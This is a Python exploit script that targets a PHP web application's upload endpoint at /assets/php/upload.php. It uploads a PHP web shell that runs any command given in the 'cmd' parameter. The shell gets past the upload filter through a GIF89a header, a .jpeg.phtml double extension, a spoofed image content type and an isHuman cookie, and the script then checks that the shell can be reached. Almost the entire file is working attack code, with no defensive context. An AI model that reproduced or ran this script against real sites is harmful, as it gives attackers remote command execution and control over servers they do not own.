
import requests
import os
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) != 2:
    print("Usage: python " + sys.argv[0] + " <target_url>")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
        "Accept": "text/plain, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745",
        "Origin": sys.argv[1],
        "Connection": "close",
        "Referer": sys.argv[1]
    }

    # Webshell payload
    webshell = '''<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>'''

    # Complete multipart data with webshell
    data = "-----------------------------31046105003900160576454225745\r\n"
    data += "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.jpeg.phtml\"\r\n"
    data += "Content-Type: image/gif\r\n\r\n"
    data += "GIF89a\n" + webshell + "\r\n"
    data += "-----------------------------31046105003900160576454225745--\r\n"

    # Upload the webshell
    requests.post(url, headers=headers, data=data, verify=False, cookies={'isHuman': '1'})

    print("Webshell uploaded. Trying to access it...")

    # Access the webshell
    shell_url = sys.argv[1] + "/assets/data/usrimg/she_ll.jpeg.phtml"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    r = requests.get(shell_url, headers=headers, verify=False)
    if r.status_code == 200:
        print("Webshell is accessible at:", shell_url)
    else:
        print("Failed to access the webshell.")
